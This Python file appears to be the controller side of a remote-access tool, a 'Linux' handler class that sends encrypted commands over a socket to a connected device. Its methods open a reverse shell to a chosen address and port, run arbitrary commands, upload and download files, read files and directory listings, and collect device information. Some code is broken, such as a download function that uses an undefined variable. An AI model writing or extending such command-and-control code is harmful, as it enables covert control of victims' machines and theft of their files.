from Utils import *
from Handlers.base import Base_Handler

class Linux(Base_Handler):
    """The Linux Handler Class to interact with the Device"""
    def save_infos(self):
        """Save Infos to the Device Database"""
        infos = self.infos()

    def __init__(self, conn, addr, key, id):
        super().__init__(addr, key, id)
        self.conn = conn
    def alive(self):
        try:
            self.conn.send(self.encrypt("alive:"))
        except socket.error:
            return False
        return True
    # BASE Features
    def load_module(self, module):
        # Send the Module to the Device
        pass

    def execute_module(self, module):
        # Send a Request to execute a Module
        # Check if Modules is loaded
        # Get Output from the Module
        try:
            with open(f"Modules/{module}.py", "r") as f:
                pass
        except FileNotFoundError:
            return "Module not found"
        self.conn.send(self.encrypt(f"module:"))
        time.sleep(1)
        self.conn.send(self.encrypt(module))
        pass

    def revshell(self, address, port):
        """Open a Reverse Shell to a given Address:Port
        Args:
            address (str): Receiver Address
            port (int): Receiver Port

        Returns:
            str: Output or Error Message
        """
        self.conn.send(self.encrypt(f"shell:{address}:{port}"))
        output = self.decrypt(self.conn.recv(1024))
        if output.startswith("!"):
            raise Exception("Couldn't open a Reverse Shell")
        else:
            return output

    def file_upload(self, fil, path):
        """Upload a File to a Device
        Args:
            fil (string): File to Upload
            path (string): Path to Upload the File to
        Returns:
            str: Output or Error Message
        """
        f = open(fil, "rb")
        fil = fil.split("/")
        self.conn.send(self.encrypt(f"file-u:{fil[-1]}|{path}"))
        time.sleep(1)
        self.conn.sendfile(f)
        output = self.decrypt(self.conn.recv(1024))
        if output.startswith("!"):
            raise Exception("File Upload Failed")
        else:
            return output

    def file_download(self, device_path, own_path):
        """Upload a File to a Device
        Args:
            fil (string): File to Upload
            device_path (string): Path to Download the File from
            own_path (string): Path to Download the File to

        Returns:
            str: Output or Error Message
        """
        f = open(fil, "rb")
        fil = fil.split("/")
        self.conn.send(self.encrypt(f"file-d:{device_path}"))
        fil = self.conn.recv(1024)
        if fil.startswith("!"):
            raise Exception("Couldn't download the File")
        else:
            with open(own_path, "wb") as f:
                f.write(fil)
            return "File Downloaded to " + own_path

    def rce(self, cmd):
        """Send a Cmd to a Device and return the Output
        Args:
            cmd (str): Command to execute

        Returns:
            str: Output of the command or Error Message
        """
        self.conn.send(self.encrypt(f"cmd:{cmd}"))
        output = self.decrypt(self.conn.recv(1024))
        return output

    def infos(self):
        """Get Infos about a Device
        Args:
        Returns:
            str: Infos about the Device
        """
        self.conn.send(self.encrypt(f"infos:"))
        output = self.decrypt(self.conn.recv(1024))
        return output

    def get_directory_contents(self, dir):
        """Get the contents of a directory
        Args:
            dir (str): Directory to get the contents of
        Returns:
            output (str): Output or Error Message
        """
        self.conn.send(self.encrypt(f"dir:{dir}"))
        output = self.decrypt(self.conn.recv(1024))
        if output.startswith("!"):
            raise Exception("Couldn't get the Directory")
        else:
            return output

    def get_file_contents(self, path):
        """Get the contents of a File
        Args:
            path (str): Path to the File
        Returns:
            output (str): Output or Error Message
        """
        self.conn.send(self.encrypt(f"content:{path}"))
        output = self.decrypt(self.conn.recv(1024))
        if output.startswith("!"):
            raise Exception("Couldn't get the File")
        else:
            return output
